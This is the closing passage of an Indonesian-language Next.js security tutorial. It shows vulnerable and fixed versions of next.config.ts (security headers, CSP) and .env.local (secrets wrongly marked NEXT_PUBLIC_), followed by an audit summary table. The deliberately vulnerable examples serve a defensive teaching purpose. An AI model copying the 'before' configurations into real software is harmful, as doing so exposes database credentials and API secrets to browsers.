  return Response.json({ success: true });
}
```

---

### File 6: next.config.ts

**BEFORE — Vulnerable:**

```typescript
// ❌ next.config.ts (VULNERABLE — tidak ada security headers)
import type { NextConfig } from 'next';

const nextConfig: NextConfig = {
  // ... config lainnya
};

export default nextConfig;
```

**AFTER — Fixed:**

```typescript
// ✅ next.config.ts (FIXED)
import type { NextConfig } from 'next';

const isDev = process.env.NODE_ENV === 'development';

const ContentSecurityPolicy = `
  default-src 'self';
  script-src 'self' ${isDev ? "'unsafe-eval'" : ''};
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self';
  connect-src 'self' https://api.yourapp.com ${isDev ? 'ws://localhost:3000' : ''};
  frame-ancestors 'none';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests;
`;

const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: ContentSecurityPolicy.replace(/\n/g, '').replace(/\s+/g, ' ').trim(),
  },
  {
    key: 'X-Frame-Options',
    value: 'DENY',
  },
  {
    key: 'X-Content-Type-Options',
    value: 'nosniff',
  },
  {
    key: 'Referrer-Policy',
    value: 'strict-origin-when-cross-origin',
  },
  {
    key: 'Permissions-Policy',
    value: 'camera=(), microphone=(), geolocation=(self), payment=()',
  },
  {
    key: 'Strict-Transport-Security',
    value: 'max-age=63072000; includeSubDomains; preload',
  },
];

const nextConfig: NextConfig = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: securityHeaders,
      },
    ];
  },
  compiler: {
    removeConsole: !isDev, // hapus console.log di production
  },
};

export default nextConfig;
```

---

### File 7: .env.local

**BEFORE — Vulnerable:**

```bash
# ❌ .env.local (VULNERABLE)
NEXT_PUBLIC_DATABASE_URL=postgresql://user:password@localhost:5432/mydb
NEXT_PUBLIC_JWT_SECRET=super-secret-key-12345
NEXT_PUBLIC_OPENAI_API_KEY=sk-xxxxxxxxxxxxxxxx
NEXT_PUBLIC_STRIPE_SECRET_KEY=sk_live_xxxxxxxx

# Ini semua exposed ke browser!
```

**AFTER — Fixed:**

```bash
# ✅ .env.local (FIXED)

# === SERVER ONLY (tidak perlu NEXT_PUBLIC_) ===
DATABASE_URL=postgresql://user:password@localhost:5432/mydb
JWT_SECRET=super-secret-key-12345
OPENAI_API_KEY=sk-xxxxxxxxxxxxxxxx
STRIPE_SECRET_KEY=sk_live_xxxxxxxx
NEXTAUTH_SECRET=another-secret-for-nextauth

# === CLIENT SAFE (boleh NEXT_PUBLIC_) ===
NEXT_PUBLIC_API_URL=https://api.yourapp.com
NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY=pk_live_xxxxxxxx
NEXT_PUBLIC_GOOGLE_MAPS_KEY=AIzaxxxxxxxx
NEXT_PUBLIC_APP_NAME=My Blog
```

---

### Hasil Audit: Ringkasan

| File | Vulnerability | Severity | Status |
|------|--------------|----------|--------|
| `CommentSection.tsx` | XSS via dangerouslySetInnerHTML | 🔴 High | ✅ Fixed |
| `UserProfile.tsx` | XSS via javascript: href | 🔴 High | ✅ Fixed |
| `app/admin/page.tsx` | Client-side auth bypass | 🔴 High | ✅ Fixed |
| `lib/storage.ts` | Token in localStorage | 🟡 Medium | ✅ Fixed |
| `api/comment/route.ts` | No auth + no input validation | 🔴 High | ✅ Fixed |
| `next.config.ts` | Missing security headers | 🟡 Medium | ✅ Fixed |
| `.env.local` | Secrets exposed to client | 🔴 Critical | ✅ Fixed |

---

## Penutup

Security bukan sesuatu yang di-bolt on belakangan. Kalau kamu mulai mikir soal ini dari awal — dari cara kamu render data, cara kamu simpan token, cara kamu set cookie — semua jadi lebih natural.

**3 hal yang paling sering di-skip dan paling berbahaya:**

1. **`dangerouslySetInnerHTML` tanpa sanitasi** — jangan pernah. Kalau harus, DOMPurify dulu.
2. **Token/secret di localStorage atau env `NEXT_PUBLIC_`** — ingat: semua yang di-client bisa dibaca.
3. **Proteksi hanya di client-side** — server harus jadi gerbang utama, bukan hanya browser.

Mulai dari yang simple: pasang security headers di `next.config.ts`, jalankan `npm audit` sebelum setiap deploy, dan biasakan curiga sama apapun yang masuk dari user.

Selamat mengamankan app-mu! 🔒
